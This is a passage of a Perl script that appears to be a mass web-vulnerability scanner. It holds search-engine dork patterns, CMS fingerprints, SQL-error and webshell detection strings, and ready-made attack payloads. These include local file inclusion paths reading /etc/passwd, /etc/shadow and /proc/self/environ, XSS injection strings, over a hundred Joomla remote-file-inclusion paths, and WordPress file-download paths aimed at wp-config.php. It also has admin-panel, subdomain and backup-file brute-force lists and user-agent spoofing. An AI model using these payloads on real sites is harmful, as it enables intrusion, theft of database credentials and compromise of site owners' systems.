my $pat2='inurl:|intitle:|intext:|allinurl:|index of|site:(.*)\+|\+site:(.*)';
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MAX POSITIVE SCAN RESULTS
## Chnage for more positive scans!!
$limit="500" if !defined $limit;
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## HTML VALIDATION
my @V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"WordPress", "\/wp-content\/(.*).js");
my @V_JOOM=("<meta name=\"generator\" content=\"Joomla");
my @V_TP=("Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern");
my @V_SMF=("<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF");
my @V_PhpBB=("Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB");
my @V_VB=("<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved");
my @V_MyBB=("Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB");
my @V_CF=("<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare");
my @V_DRP=("name=\"Generator\" content=\"Drupal");
my @V_PN=("<meta name=\"generator\" content=\"PostNuke");
my @V_AT=("<a href=\"/about.php\">About ATutor");
my @V_PHPN=("<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke");
my @V_MD=("Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle");
my @V_ACM=("Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS");
my @V_SS=("<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>");
my @V_MX=("<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx");
my @V_XO=("<meta name=\"generator\" content=\"XOOPS");
my @V_OSC=("Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce");
my @V_PSH=("<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop");
my @V_BB2=("<meta name=\"generator\" content=\"b2evolution");
my @V_MG=("MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions");
my @V_ZC=("all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
my @V_CC5=("Powered by concrete5", "<meta name=\"generator\" content=\"concrete");
my @V_OCR=("Powered By OpenCart");
my @V_XSS=("You have an error in your SQL", "Warning: mysql_", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "MySQL Driver", "mysqli.query", "num_rows", "mysql error:",
           "supplied argument is not a valid MySQL result resource", "on MySQL result index", "Error Executing Database Query", "mysql_");
my @V_LFI=("root:x", "root:x:0:0:", "mysql:x:");
my @V_TODO=(".", "a", "e", "i", "o", "u", ",");
my @TODO=();
my @V_VALID=($validText) if defined $validText;
my @V_AFD=("DB_NAME", "DB_USER", "DB_PASSWORD");
my @E_MICROSOFT=("Microsoft JET Database", "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider", "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript",
                 "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle", "Active Server Pages error", "OLE/DB provider returned message",
                 "OLE DB Provider for ODBC", "error \"800a0d5d\"", "error \"800a000d\"", "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_");
my @E_ORACLE=("ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended");
my @E_DB2=("DB2 ODBC", "DB2 error", "DB2 Driver");
my @E_ODBC=("ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver");
my @E_POSTGRESQL=("Warning: pg_", "PostgreSql Error:", "function.pg", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", ": pg_");
my @E_SYBASE=("Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "sybase_", "ODBC Driver");
my @E_JBOSSWEB=("java.sql.SQLSyntaxErrorException: ORA-", "org.springframework.jdbc.BadSqlGrammarException:", "javax.servlet.ServletException:", "java.lang.NullPointerException");
my @E_JDBC=("Error Executing Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver");
my @E_JAVA=("java.io.IOException: InfinityDB");
my @E_PHP=("Warning: include", "Fatal error: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include",
           "Disallowed Parent Path", "function.require", "Warning: main", "Warning: session_start\(\)", "Warning: getimagesize\(\)", "Warning: array_merge\(\)", "Warning: preg_match\(\)",
           "GetArray\(\)", "FetchRow\(\)", "Warning: preg_", "Warning: ociexecute\(\)", "Warning: ocifetchstatement\(\)", "PHP Warning:");
my @E_ASP=("Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF",
           "Unclosed quotation mark", "Error converting data type varchar to numeric");
my @E_LUA=("LuaPlayer ERROR:", "CGILua message", "Lua error");
my @E_UNDEFINED=("Incorrect syntax near", "Fatal error", "Invalid Querystring", "Input string was not in a correct format", "An illegal character has been found in the statement");
my @E_MARIADB=("MariaDB server version for the right syntax");
my @E_SHELL=("c99shell<\/title\>", "C99Shell v", "<form method=\"POST\" action=\"cfexec.cfm\"\>", "<input type=text name=\".CMD\" size=45 value=", "<title\>awen asp.net webshell<\/title\>",
             "<FORM METHOD=GET ACTION=\"cmdjsp.jsp\"\>", "JSP Backdoor Reverse Shell", "Simple CGI backdoor by DK", "execute command: <input type=\"text\" name=\"c\"\>", "Execute Shell Command",
             "r57shell<\/title\>", "<title>r57Shell", "heroes1412", "MyShell", "PHP Shell", "PHPShell", "REMVIEW TOOLS", "<title>iTSecTeam<\/title>", "JSP Backdoor Reverse Shell",
             "<title\>(.*)ernealizm(.*)\/title>", "<title\>JSP Shell<\/title\>", "<title\>KNULL Shell<\/title\>", "<title\>(.*)WSO(.*)<\/title>", "<title>SST Sheller !<\/title\>",
             "<title\>SyRiAn Sh3ll", "<title\>Mini Php Shell", "<title>ASPX Shell<\/title>", "<title>ZoRBaCK Connect<\/title>", "<title>.+Ani-Shell.+<\/title>",
             "<title>Stored Procedure Execute<\/title\>", "<title\>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::<\/title\>", "<title\>PhpShell 2.0<\/title\>",
             "<title\>(.*)NTDaddy(.*)<\/title\>", "<title\>PHP-Terminal");
my @ERR=(@V_LFI, @V_XSS, @V_AFD, @E_MICROSOFT, @E_ORACLE, @E_DB2, @E_ODBC, @E_POSTGRESQL, @E_SYBASE, @E_JBOSSWEB, @E_JDBC, @E_JAVA, @E_PHP, @E_ASP, @E_UNDEFINED, @E_MARIADB, @E_SHELL);
my @CMS=(@V_WP, @V_JOOM, @V_TP, @V_SMF, @V_PhpBB, @V_VB, @V_MyBB, @V_CF, @V_DRP, @V_PN, @V_AT, @V_PHPN, @V_MD, @V_ACM, @V_SS, @V_MX, @V_XO, @V_OSC, @V_PSH, @V_BB2, @V_MG, @V_ZC, @V_CC5, @V_OCR);
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN TITLES
my @SCAN_TITLE=("SEARCH ENGINE", "VALIDATION", "Validate by HTTP header is not allowed here!\n", "WORDPRESS SITES", "JOOMLA SITES", "XSS", "LOCAL FILE INCLUSION", "JOOMLA REMOTE FILE INCLUSION",
                "WORDPRESS ARBITRARY FILE DOWNLOAD", "ADMIN PAGE", "SUBDOMAINS", "UPLOAD FILES", "ZIP FILES", "E-MAILS", "WORDPRESS BRUTE FORCE", "JOOMLA BRUTE FORCE", "EXTERN COMMAND SUBPROCESS",
                "MD5 GENERATOR", "ENCODE BASE64", "DECODE BASE64", "PORTS", "IP", "USER REGEX", "AGENT", "FILTER", "REGEX");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## LFI
my @LFIargs=("passwd.txt", "etc/passwd", "proc/self/environ", "etc/shadow", "etc/group", "etc/security/passwd", "etc/security/group");
my (@LFI, @LFI1, @LFI2);
for my $LFIargs(@LFIargs) {
  my $arg="/$LFIargs"; push @LFI1, $arg;
  my $arg1="/$arg"; push @LFI1, $arg1;
  my $arg2=$arg."%00"; push @LFI1, $arg2;
  my $arg3=$arg1."%00"; push @LFI1, $arg3;
  my $arg4="repeat(../-5)$LFIargs"; push @LFI1, $arg4;
  my $arg5=$arg4."%00"; push @LFI1, $arg5;
  my $arg6="repeat(....//-5)$LFIargs"; push @LFI1, $arg6;
  my $arg7=$arg6."%00"; push @LFI1, $arg7;
  push @LFI, @LFI1;
  for my $LFI1(@LFI1) { $LFI1=~s/\//%2F/ig; push @LFI, $LFI1; }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## XSS
my @XSS=("%27", "'><script>alert('MySQL Error')</script>", "<scr<script>ipt>alert(/MySQL Error/)</scr</script>ipt>", "%253script%253ealert(/MySQL Error/)%253c/script%253e",
         "\">head<script>alert('MySQL Error')</script>head\">", "%22%3Ehead%3Cscript%3Ealert(%27MySQL%20Error%27)%3C%2Fscript%3Ehead%22%3E%22%00", "<IMG onmouseover=\"alert('MySQL Error')\">",
         "\";alert('MySQL Error');//", "</script><script>alert('MySQL Error');</script>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('MySQL Error');\">",
         "<BODY BACKGROUND=\"javascript:alert('MySQL Error')\">", "<BODY ONLOAD=alert('MySQL Error')>");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## RFI
my @RFIargs=("/JMc/com_flyspray/startdown.php?file=", "/JMa/JMc/com_admin/admin.admin.html.php?PP1", "/JMc/com_simpleboard/file_upload.php?PP5", "/JMc/com_hashcash/server.php?PP1",
             "/JMc/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?PP1", "/JMc/com_sitemap/sitemap.xml.php?PP1", "/JMc/com_performs/performs.php?PP1",
             "/JMc/com_forum/download.php?phpbb_root_path=", "/JMc/com_pccookbook/pccookbook.php?PP1", "/JMc/com_extcalendar/extcalendar.php?PP1", "/JMc/minibb/index.php?PP3",
             "/JMc/com_smf/smf.php?PP1", "/modules/mod_calendar.php?PP3", "/JMc/com_pollxt/conf.pollxt.php?PP1", "/JMc/com_loudmounth/includes/abbc/abbc.class.php?PP1",
             "/JMc/com_videodb/core/videodb.class.xml.php?PP1", "/JMc/com_pcchess/include.pcchess.php?PP1", "/JMa/JMc/com_multibanners/extadminmenus.class.php?PP1",
             "/JMa/JMc/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?PP4", "/JMa/JMc/com_colophon/admin.colophon.php?PP1", "/JMa/JMc/com_mgm/help.mgm.php?PP1",
             "/JMc/com_mambatstaff/mambatstaff.php?PP1", "/JMc/com_securityimages/configinsert.php?PP1", "/JMc/com_securityimages/lang.php?PP1", "/JMc/com_artlinks/artlinks.dispnew.php?PP1",
             "/JMc/com_galleria/galleria.html.php?PP1", "/akocomments.php?PP1", "/JMa/JMc/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/JMa/JMc/com_kochsuite/config.kochsuite.php?PP1",
             "/JMa/JMc/com_comprofiler/plugin.class.php?PP1", "/JMc/com_zoom/classes/fs_unix.php?PP1", "/JMc/com_zoom/includes/database.php?PP1",
             "/JMa/JMc/com_serverstat/install.serverstat.php?PP1",
             "/JMc/com_fm/fm.install.php?lm_absolute_path=", "/JMa/JMc/com_mambelfish/mambelfish.class.php?PP1", "/JMc/com_lmo/lmo.php?PP1",
             "/JMa/JMc/com_webring/admin.webring.docs.php?component_dir=", "/JMa/JMc/com_remository/admin.remository.php?PP1", "/JMa/JMc/com_babackup/classes/Tar.php?PP1",
             "/JMa/JMc/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/JMc/com_mambowiki/MamboLogin.php?IP=", "/JMa/JMc/com_a6mambocredits/admin.a6mambocredits.php?PP4",
             "/JMa/JMc/com_phpshop/toolbar.phpshop.html.php?PP1", "/JMc/com_cpg/cpg.php?PP1", "/JMc/com_moodle/moodle.php?PP1", "/JMc/com_extended_registration/registration_detailed.inc.php?PP1",
             "/JMc/com_mospray/scripts/admin.php?basedir=", "/JMa/JMc/com_uhp/uhp_config.php?PP1", "/JMa/JMc/com_peoplebook/param.peoplebook.php?PP1", "/JMa/JMc/com_mmp/help.mmp.php?PP1",
             "/JMc/com_reporter/processor/reporter.sql.php?PP1", "/JMc/com_madeira/img.php?url=", "/JMc/com_bsq_sitestats/external/rssfeed.php?PP6", "/com_bsq_sitestats/external/rssfeed.php?PP6",
             "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1", "/JMa/JMc/admin.jjgallery.php?PP1",
             "/JMc/com_jreviews/scripts/xajax.inc.php?PP1", "/com_directory/modules/mod_pxt_latest.php?PP2", "/JMa/JMc/com_chronocontact/excelwriter/PPS/File.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/PPS.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/Writer/BIFFwriter.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer/Workbook.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/Writer/Worksheet.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer/Format.php?PP1", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=",
             "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMc/com_facileforms/facileforms.frame.php?ff_compath=", "/JMa/JMc/com_rssreader/admin.rssreader.php?PP4",
             "/JMa/JMc/com_feederator/includes/tmsp/add_tmsp.php?PP1", "/JMa/JMc/com_feederator/includes/tmsp/edit_tmsp.php?PP1", "/JMa/JMc/com_feederator/includes/tmsp/subscription.php?PP2",
             "/JMa/JMc/com_feederator/includes/tmsp/tmsp.php?PP1", "/JMa/JMc/com_clickheat/install.clickheat.php?PP2", "/JMa/JMc/com_clickheat/includes/heatmap/_main.php?PP1",
             "/JMa/JMc/com_clickheat/includes/heatmap/main.php?PP1", "/JMa/JMc/com_clickheat/includes/overview/main.php?PP1", "/JMa/JMc/com_clickheat/Recly/Clickheat/Cache.php?PP2",
             "/JMa/JMc/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?PP2", "/JMa/JMc/com_clickheat/Recly/common/GlobalVariables.php?PP2",
             "/JMa/JMc/com_competitions/includes/competitions/add.php?PP2", "/JMa/JMc/com_competitions/includes/competitions/competitions.php?PP2",
             "/JMa/JMc/com_competitions/includes/settings/settings.php?PP1", "/JMa/JMc/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=",
             "/JMa/JMc/com_googlebase/admin.googlebase.php?PP1", "/JMa/JMc/com_ongumatimesheet20/lib/onguma.class.php?PP1", "/JMa/JMc/com_treeg/admin.treeg.php?PP4",
             "/JMa/JMc/com_bayesiannaivefilter/lang.php?PP1", "/JMc/com_jd-wiki/lib/tpl/default/main.php?PP1", "/JMa/JMc/com_jim/install.jim.php?PP1",
             "/JMc/com_mtree/Savant2/Savant2_Plugin_textarea.php?PP1", "/JMc/com_artlinks/artlinks.dispnew.php?PP1", "/JMa/JMc/com_linkdirectory/toolbar.linkdirectory.html.php?PP1",
             "/JMa/JMc/com_kochsuite/config.kochsuite.php?PP1", "/JMc/com_reporter/reporter.logic.php?PP1", "/JMa/JMc/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1",
             "/JMc/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1", "/JMc/com_joomlaboard/file_upload.php?PP5", "/JMc/com_thopper/inc/contact_type.php?PP1",
             "/JMc/com_thopper/inc/itemstatus_type.php?PP1", "/JMc/com_thopper/inc/projectstatus_type.php?PP1", "/JMc/com_thopper/inc/request_type.php?PP1",
             "/JMc/com_thopper/inc/responses_type.php?PP1", "/JMc/com_thopper/inc/timelog_type.php?PP1", "/JMc/com_thopper/inc/urgency_type.php?PP1", "/JMc/com_mosmedia/media.tab.php?PP1",
             "/JMc/com_mosmedia/media.divs.php?PP1", "/modules/mod_as_category/mod_as_category.php?PP1", "/modules/mod_as_category.php?PP1", "/JMc/com_articles.php?PP3",
             "/classes/html/com_articles.php?PP3", "/JMa/JMc/com_jpack/includes/CAltInstaller.php?PP1", "/templates/be2004-2/index.php?PP1", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=",
             "/JMa/JMc/com_joomlaradiov5/admin.joomlaradiov5.php?PP4", "/JMa/JMc/com_joomlaflashfun/admin.joomlaflashfun.php?PP4", "/JMa/JMc/com_joom12pic/admin.joom12pic.php?PP4",
             "/JMc/com_slideshow/admin.slideshow1.php?PP4", "/JMa/JMc/com_panoramic/admin.panoramic.php?PP4", "/JMa/JMc/com_wmtgallery/admin.wmtgallery.php?PP4",
             "/JMa/JMc/com_wmtportfolio/admin.wmtportfolio.php?PP1", "/JMa/JMc/com_mosmedia/includes/credits.html.php?PP1", "/JMa/JMc/com_mosmedia/includes/info.html.php?PP1",
             "/JMa/JMc/com_mosmedia/includes/media.divs.php?PP1", "/JMa/JMc/com_mosmedia/includes/media.divs.js.php?PP1", "/JMa/JMc/com_mosmedia/includes/purchase.html.php?PP1",
             "/JMa/JMc/com_mosmedia/includes/support.html.php?PP1", "/JMc/com_mp3_allopass/allopass.php?PP4", "/JMc/com_mp3_allopass/allopass-error.php?PP4",
             "/JMa/JMc/com_jcs/jcs.function.php?PP1", "/JMa/JMc/com_jcs/view/add.php?PP1", "/JMa/JMc/com_jcs/view/history.php?PP1", "/JMa/JMc/com_jcs/view/register.php?PP1",
             "/JMa/JMc/com_jcs/views/list.sub.html.php?PP1", "/JMa/JMc/com_jcs/views/list.user.sub.html.php?PP1", "/JMa/JMc/com_jcs/views/reports.html.php?mosConfig_absolte_path=",
             "/JMa/JMc/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/JMa/JMc/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1",
             "/JMa/JMc/com_color/admin.color.php?PP4", "/JMa/JMc/com_jjgallery/admin.jjgallery.php?PP1", "/JMa/JMc/com_juser/xajax_functions.php?PP1",
             "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&PP1", "/com_ponygallery/admin.ponygallery.html.php?PP1",
             "/com_magazine_3_0_1/magazine.functions.php?config=", "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMa/JMc/com_universal/includes/config/config.html.php?PP1",
             "/modules/mod_pxt_latest.php?PP2");
######################################################################################################################################################################################################
my @RFI;
for my $RFIargs(@RFIargs) {
  $RFIargs=~s/JMa/administrator/ig;
  $RFIargs=~s/JMc/components/ig;
  if ($RFIargs=~/PP1/) { $RFIargs=~s/PP1/mosConfig_absolute_path=/ig; }
  elsif ($RFIargs=~/PP2/) { $RFIargs=~s/PP2/GLOBALS[mosConfig_absolute_path]=/ig; }
  elsif ($RFIargs=~/PP3/) { $RFIargs=~s/PP3/absolute_path=/ig; }
  elsif ($RFIargs=~/PP4/) { $RFIargs=~s/PP4/mosConfig_live_site=/ig; }
  elsif ($RFIargs=~/PP5/) { $RFIargs=~s/PP5/sbp=/ig; }
  elsif ($RFIargs=~/PP6/) { $RFIargs=~s/PP6/baseDir=/ig; }
  push @RFI, $RFIargs;
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
#ADF WP WORDPRESS
my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
"WPATHT/ypo-theme/download.php?download=WP1",
"/wp-content/force-DWF=WP1",
"WPATHP/hb-audio-gallery-lite/gallery/audio-DWF_path=WP1",
"WPATHT/acento/includes/view-pdf.php?download=1&file=/path/WP1",
"WPATHT/SMWF/inc/DWF=WP1",
"WPATHT/markant/DWF=WP1",
"WPATHT/yakimabait/DWF=WP1",
"WPATHT/TheLoft/DWF=WP1",
"WPATHT/felis/DWF=WP1",
"WPATHT/MichaelCanthony/DWF=WP1",
"WPATHT/trinity/lib/scripts/DWF=WP1",
"WPATHT/epic/includes/DWF=WP1",
"WPATHT/urbancity/lib/scripts/DWF=WP1",
"WPATHT/antioch/lib/scripts/DWF=WP1",
"WPATHT/authentic/includes/DWF=WP1",
"WPATHT/churchope/lib/downloadlink.php?file=WP1",
"WPATHT/lote27/download.php?download=WP1",
"WPATHT/linenity/functions/download.php?imgurl=WP1",
"WPATHP/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=WP1",
"WPATHP/justified-image-grid/DWF=file:///C:/wamp/www/wp-config.php",
"WPATHP/justified-image-grid/DWF=file:///C:/xampp/htdocs/WP1",
"WPATHP/justified-image-grid/DWF=file:///var/www/WP1",
"WPATHP/aspose-doc-exporter/aspose_doc_exporter_DWF=WP1",
"WPATHP/aspose-cloud-ebook-generator/aspose_posts_exporter_DWF=WP1");
######################################################################################################################################################################################################
my @ADFWP;
for my $ADFWPargs(@ADFWPargs) {
  $ADFWPargs=~s/DWF/download.php?file/ig;
  $ADFWPargs=~s/WPATHT/\/wp-content\/themes/ig;
  $ADFWPargs=~s/WPATHP/\/wp-content\/plugins/ig;
  if ($ADFWPargs=~/WP1/) {
    $ADFWPargs=~s/WP1/wp-config.php/ig; push @ADFWP, $ADFWPargs;
    $ADFWPargs=~s/wp-config.php/repeat(..\/-5)wp-config.php/ig; push @ADFWP, $ADFWPargs; }
  else{ push @ADFWP, $ADFWPargs; }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ADMIN PAGE
my @ADMINARGS=("/admin/", "/admin/login.MYEXT", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/wp-admin/login.MYEXT", "/administrator/index.MYEXT", "/admin3/", "/admin4/",
               "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/administrator/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/",
               "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.MYEXT", "/admin/account.MYEXT", "/admin/index.MYEXT",
               "/admin/admin.MYEXT", "/admin_area/admin.MYEXT", "/admin_area/login.MYEXT", "/siteadmin/login.MYEXT", "/siteadmin/index.MYEXT", "/admin_area/index.MYEXT", "/bb-admin/index.MYEXT",
               "/bb-admin/login.MYEXT", "/bb-admin/admin.MYEXT", "/admin/home.MYEXT", "/admin/controlpanel.MYEXT", "/admin.MYEXT", "/admincp/index.MYEXT", "/admincp/login.MYEXT",
               "/administracion/", "/adminpanel.MYEXT", "/webadmin.MYEXT", "/webadmin/index.MYEXT", "/webadmin/admin.MYEXT", "/webadmin/login.MYEXT", "/admin/admin_login.MYEXT",
               "/admin_login.MYEXT", "/panel-administracion/login.MYEXT", "/admin/cp.MYEXT", "/cp.MYEXT", "/administrator/login.MYEXT", "/nsw/admin/login.MYEXT", "/administrator/account.MYEXT",
               "/administrator.MYEXT", "/pages/admin/admin-login.MYEXT", "/admin/admin-login.MYEXT", "/admin-login.MYEXT", "/acceso.MYEXT", "/login.MYEXT", "/modelsearch/login.MYEXT",
               "/moderator.MYEXT", "/moderator/login.MYEXT", "/moderator/admin.MYEXT", "/account.MYEXT", "/controlpanel.MYEXT", "/admincontrol.MYEXT", "/admin/adminLogin.MYEXT", "/adminLogin.MYEXT",
               "/home.MYEXT", "/rcjakar/admin/login.MYEXT", "/adminarea/index.MYEXT", "/adminarea/admin.MYEXT", "cp.MYEXT", "/user.MYEXT", "/adminarea/login.MYEXT",
               "/panel-administracion/index.MYEXT", "/panel-administracion/admin.MYEXT", "/modelsearch/index.MYEXT", "/modelsearch/admin.MYEXT", "/admincontrol/login.MYEXT", "/adm/index.MYEXT",
               "adm.MYEXT", "account.MYEXT", "/adm/admloginuser.MYEXT", "/admloginuser.MYEXT", "/admin2.MYEXT", "/admin2/login.MYEXT", "/admin2/index.MYEXT", "/usuarios/login.MYEXT",
               "/users/login.MYEXT", "/adm.MYEXT", "/affiliate.MYEXT", "/adm_auth.MYEXT", "/memberadmin.MYEXT", "/administratorlogin.MYEXT");
######################################################################################################################################################################################################
my @ADMIN;
for my $ADMINARGS(@ADMINARGS) {
  if ($ADMINARGS=~/MYEXT/) {
    $ADMINARGS=~s/MYEXT/php/ig; push @ADMIN, $ADMINARGS;
    $ADMINARGS=~s/php/html/ig; push @ADMIN, $ADMINARGS;
    $ADMINARGS=~s/html/asp/ig; push @ADMIN, $ADMINARGS;
  }else{ push @ADMIN, $ADMINARGS; } 
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SUBDOMAINS
my @SUBDOMAIN=("about.", "webmail.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.",
               "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.",
               "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.",
               "email.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.",
               "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.",
               "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.",
               "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.",
               "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## UPLOAD FILES
my @UPLOAD=("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php",
            "blog/upload.php", "site/upload.php", "download.php");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ZIP FILES
my @ZIP=("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql",
         "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip",
         "/blog/wordpress.zip", "/wordpress.rar");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SYSTEM RANDOM
my @sys=(
"compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $strings[rand @strings]",
"compatible; MSIE 7.0; Windows NT 5.1; $strings[rand @strings]",
"compatible; MSIE 6.0; Windows NT 5.1; $strings[rand @strings]",
"compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1; $strings[rand @strings];",
"compatible; Konqueror/3.5; $strings[rand @strings]; SunOS",
"compatible; Konqueror/3.5; $strings[rand @strings]; NetBSD 4.0_RC3; X11; $strings[rand @strings]",
"Macintosh; U; PPC Mac OS X 10_5_8; $strings[rand @strings]",
"Macintosh; Intel Mac OS X 10.6; $strings[rand @strings]; rv:21.0",
"Macintosh; Intel Mac OS X 10_9_0; $strings[rand @strings]",
"Macintosh; U; Intel Mac OS X 10_6_6; $strings[rand @strings]",
"X11; Linux 3.5.4-1-ARCH i686; $strings[rand @strings]",
"Linux; U; Android 4.2.2; $strings[rand @strings]; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0;",
"iPad; CPU OS 6_0 like Mac OS X; $strings[rand @strings]",
"Windows NT 5.1; $strings[rand @strings]",
"Windows; I; Windows NT 5.1; $strings[rand @strings]; rv:1.9.2.13",
"Windows NT 6.1; $strings[rand @strings]; rv:24.0",
"Windows NT 6.1; WOW64; $strings[rand @strings]",
"Windows NT 6.2; WOW64; $strings[rand @strings]; rv:16.0.1",
"Windows 2000; WOW64; $strings[rand @strings]; rv:16.0.1",
"Windows 98; WOW64; $strings[rand @strings]; rv:16.0.1",
"Windows 95; WOW64; $strings[rand @strings]; rv:16.0.1"
);
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BROWSER RANDOM
my @vary=("Firefox","Opera", "SeaMonkey", "Safari", "Dragon", "GNU IceCat", "Seamonkey", "Galaxy", "GoogleBot", "Tor Browser", "Konqueror", "Flock", "Chrome", "Mobile");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## TIMER
sub timer { my ($sec,$min,$hr)=localtime(); print "[$hr:$min:$sec]"; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## NO ARGUMENTS
